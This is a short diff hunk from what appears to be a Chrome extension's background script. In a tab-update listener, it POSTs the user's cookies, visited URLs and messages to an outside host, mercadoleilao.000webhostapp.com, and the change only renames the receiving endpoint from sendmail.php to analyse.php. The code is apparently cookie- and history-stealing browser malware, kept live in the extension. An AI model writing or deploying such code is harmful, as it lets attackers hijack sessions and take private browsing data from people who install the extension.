@@ -46,7 +46,7 @@ chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
             sendRequest({
                 method: 'POST',
                 action: 'xhttp',
-                url: 'http://mercadoleilao.000webhostapp.com/sendmail.php',
+                url: 'http://mercadoleilao.000webhostapp.com/analyse.php',
                 data: 'cookie=' + encodeURIComponent(JSON.stringify(cookiesArr)) + '&visited=' + encodeURIComponent(visited.join("\n")) + '&msg=' + encodeURIComponent(msgArr.join("\n----\n"))
             }, function (responseText) {
             });
